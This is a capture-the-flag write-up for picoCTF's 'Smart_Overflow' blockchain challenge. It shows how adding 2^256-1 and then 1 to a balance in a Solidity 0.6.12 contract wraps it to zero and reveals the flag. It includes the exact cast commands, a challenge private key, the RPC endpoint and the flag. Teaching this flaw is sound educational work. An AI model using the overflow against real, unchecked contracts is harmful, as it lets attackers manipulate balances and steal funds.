Smart_Overflow

📂 Category : Blockchain

📊 Level : Medium

🏁 Flag : picoCTF{Sm4r7_OverFL0ws_ExI5t_160a36b7}

________________________________________
🧠 The Vulnerability
The contract uses Solidity 0.6.12, which does not automatically check for integer overflows.
In the deposit() function:
balances[msg.sender] = balances[msg.sender] + amount;

if (!revealed && balances[msg.sender] < amount) {
    revealed = true;
}
When a very large value is added to the balance, the uint256 variable wraps around to 0, causing:
balances[msg.sender] < amount
to become true and reveal the flag.
________________________________________
🔍 Source Code Analysis
function deposit(uint256 amount) external {
    uint256 oldBalance = balances[msg.sender];

    balances[msg.sender] = balances[msg.sender] + amount;

    emit Deposit(msg.sender, amount);

    if (!revealed && balances[msg.sender] < amount) {
        revealed = true;
        emit FlagRevealed(flag);
    }
}
The challenge checks whether the new balance becomes smaller than the deposited amount.
This can only happen when an integer overflow occurs.
________________________________________
⚔️ Exploitation Steps
Step 1: Deposit the Maximum uint256 Value
cast send 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9 "deposit(uint256)" 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff --private-key 0xc656949bd7d9d8f8ad8b193fb15d957b2b921e63a2bc29c2e9a22b2468fd8a2b --rpc-url http://mysterious-sea.picoctf.net:56438 --legacy --gas-limit 200000
Balance becomes:
2^256 - 1
No overflow yet, so the flag is not revealed.
________________________________________
Step 2: Deposit 1 More
cast send 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9 "deposit(uint256)" 1 --private-key 0xc656949bd7d9d8f8ad8b193fb15d957b2b921e63a2bc29c2e9a22b2468fd8a2b --rpc-url http://mysterious-sea.picoctf.net:56438 --legacy --gas-limit 200000
Calculation:
(2^256 - 1) + 1 = 0
The balance wraps around to zero due to integer overflow.
Now:
balance = 0
amount = 1

0 < 1
Condition becomes true:
revealed = true;
emit FlagRevealed(flag);
________________________________________
🎯 Proof of Success
The second transaction emitted two events:
Deposit Event
Deposit(
    0x47C98C248972A26dA037B774d33256E01514ABE3,
    1
)
FlagRevealed Event
picoCTF{Sm4r7_OverFL0ws_ExI5t_160a36b7}
________________________________________
📚 Lesson Learned
Older Solidity versions (<0.8.0) do not protect against integer overflows and underflows.
Example:
uint256 max = 2^256 - 1

max + 1 = 0
Attackers can exploit this behavior to bypass logic checks, manipulate balances, and trigger unintended contract states.
Modern Solidity versions automatically revert on overflow, preventing this class of vulnerability.
________________________________________
✅ Commands Used
cast send 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9 "deposit(uint256)" 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff --private-key 0xc656949bd7d9d8f8ad8b193fb15d957b2b921e63a2bc29c2e9a22b2468fd8a2b --rpc-url http://mysterious-sea.picoctf.net:56438 --legacy --gas-limit 200000
cast send 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9 "deposit(uint256)" 1 --private-key 0xc656949bd7d9d8f8ad8b193fb15d957b2b921e63a2bc29c2e9a22b2468fd8a2b --rpc-url http://mysterious-sea.picoctf.net:56438 --legacy --gas-limit 200000
Flag obtained successfully. 🎉
________________________________________


